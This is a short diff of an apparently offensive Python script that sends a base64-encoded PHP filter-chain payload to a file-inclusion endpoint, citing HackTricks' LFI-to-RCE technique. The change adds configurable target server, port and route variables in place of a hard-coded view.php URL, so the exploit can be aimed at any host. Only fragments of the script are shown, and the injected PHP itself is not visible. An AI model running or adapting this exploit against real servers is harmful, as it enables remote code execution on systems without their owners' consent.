@@ -1,6 +1,11 @@
 #!/usr/bin python3
 import argparse,base64,re,requests
 
+#Define the target 
+targetUrl="SERVER_ADDR"  # e.g(1.2.3.4, mydomain)
+targetPort="APP_PORT"    # e.g(80,8080,3000)
+targetRoute="FILE"       # e.g(view.php, page.php, search.php)
+
 # - Useful infos -
 # https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
 # https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
@@ -114,7 +119,7 @@ def main():
         base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
         chain = generate_filter_chain(base64_value)
         payload=base64.b64encode(bytes(chain, 'utf-8')).decode('utf-8')
-        url="http://[SERVER_ADDR:PORT]/view.php"
+        url=f"http://{targetUrl}:{targetPort}/{targetRoute}"
         data = {
             "src":payload
         }
